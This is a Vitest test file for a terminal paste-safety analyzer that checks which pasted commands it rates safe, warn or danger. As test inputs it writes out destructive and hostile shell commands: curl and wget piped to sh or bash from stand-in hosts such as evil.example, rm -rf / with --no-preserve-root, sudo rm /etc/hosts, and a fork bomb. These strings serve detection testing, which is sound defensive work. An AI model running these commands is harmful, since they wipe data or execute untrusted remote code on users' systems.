/**
 * Paste-safety analyzer table tests. We keep the matrix compact but cover
 * every heuristic branch so a pattern regression shows up here before it
 * makes it into the dialog / PTY path.
 */

import { describe, expect, it } from 'vitest';

import { analyze, needsConfirmation } from '../analyze.js';

describe('analyze', () => {
  it('safe: trivial single-line paste', () => {
    const r = analyze('ls -la');
    expect(r.level).toBe('safe');
    expect(r.reasons).toEqual([]);
    expect(r.lineCount).toBe(1);
  });

  it('safe: empty string', () => {
    const r = analyze('');
    expect(r.level).toBe('safe');
    expect(r.lineCount).toBe(0);
  });

  it('warn: multi-line paste with \\n', () => {
    const r = analyze('echo one\necho two\necho three');
    expect(r.level).toBe('warn');
    expect(r.reasons.some((s) => s.includes('Multi-line'))).toBe(true);
    expect(r.lineCount).toBe(3);
  });

  it('warn: multi-line paste with \\r (classic mac / clipboard CRLF)', () => {
    const r = analyze('line1\r\nline2');
    expect(r.level).toBe('warn');
  });

  it('danger: rm -rf', () => {
    const r = analyze('rm -rf /tmp/target');
    expect(r.level).toBe('danger');
    expect(r.reasons.some((s) => s.includes('rm -rf'))).toBe(true);
  });

  it('danger: curl | sh', () => {
    const r = analyze('curl https://evil.example/bootstrap | sh');
    expect(r.level).toBe('danger');
    expect(r.reasons.some((s) => s.includes('curl'))).toBe(true);
  });

  it('danger: wget | bash', () => {
    const r = analyze('wget -qO- https://x/y | bash');
    expect(r.level).toBe('danger');
  });

  it('danger: sudo', () => {
    const r = analyze('sudo rm /etc/hosts');
    expect(r.level).toBe('danger');
    // rm -rf NOT present; still danger because sudo. Also dual-trigger OK.
    expect(r.reasons.length).toBeGreaterThan(0);
  });

  it('danger: fork bomb shape', () => {
    const r = analyze(':(){ :|:& };:');
    expect(r.level).toBe('danger');
    expect(r.reasons.some((s) => s.toLowerCase().includes('fork bomb'))).toBe(
      true,
    );
  });

  it('warn: very long paste (>10k chars)', () => {
    const r = analyze('a'.repeat(10_500));
    expect(r.level).toBe('warn');
    expect(r.reasons.some((s) => s.includes('Very long'))).toBe(true);
  });

  it('warn: many lines (>200)', () => {
    const r = analyze(new Array(250).fill('x').join('\n'));
    expect(r.level).toBe('warn');
  });

  it('danger wins over warn: rm -rf in a multi-line paste stays danger', () => {
    const r = analyze('echo hi\nrm -rf /\nfoo');
    expect(r.level).toBe('danger');
  });

  it('does NOT flag innocuous content that merely mentions words', () => {
    // "password" / "curl" as plain prose should not trip danger heuristics.
    const r = analyze('fetch the tarball with curl -O https://example.com/f.tgz');
    expect(r.level).toBe('safe');
  });

  it('needsConfirmation matches level', () => {
    expect(needsConfirmation(analyze('ls'))).toBe(false);
    expect(needsConfirmation(analyze('a\nb'))).toBe(true);
    expect(needsConfirmation(analyze('sudo ls'))).toBe(true);
  });

  it('CURL uppercase is caught', () => expect(analyze('CURL https://evil.com | sh').level).toBe('danger'));

  it('rm -r -f is caught', () => expect(analyze('rm -r -f /important').level).toBe('danger'));

  it('WGET uppercase is caught', () => expect(analyze('WGET -qO- https://evil.com | bash').level).toBe('danger'));

  it('rm -r -f --no-preserve-root is caught', () => expect(analyze('rm -r -f --no-preserve-root /').level).toBe('danger'));

  it('curl pipe with no spaces around pipe is caught', () => expect(analyze('curl https://x.com|sh').level).toBe('danger'));
});
